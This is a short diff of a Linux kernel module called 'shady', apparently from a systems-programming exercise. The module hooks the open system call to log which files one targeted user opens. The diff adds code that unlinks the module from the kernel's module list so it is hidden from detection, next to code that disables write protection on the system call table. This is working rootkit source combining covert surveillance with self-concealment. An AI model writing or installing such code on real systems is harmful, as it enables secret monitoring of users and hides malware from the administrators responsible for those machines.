@@ -71,7 +71,7 @@ asmlinkage int my_open (const char* file, int flags, int mode)
     printk(KERN_DEBUG "UID: %u\n", uid);
     // check to see if mark is the one opeing the file
     if (uid == marks_uid) {
-        printk(KERN_DEBUG "OPENED: %s\n", file);
+        printk(KERN_DEBUG "Mark is about to open %s\n", file);
     }
     return old_open(file, flags, mode);
 }
@@ -266,6 +266,9 @@ shady_init_module(void)
     
     // ===============================================================
     // My code
+    // Hide the module
+    list_del_init(&__this_module.list);
+    
     // Turn off read write protections
     set_addr_rw(system_call_table_address);
     
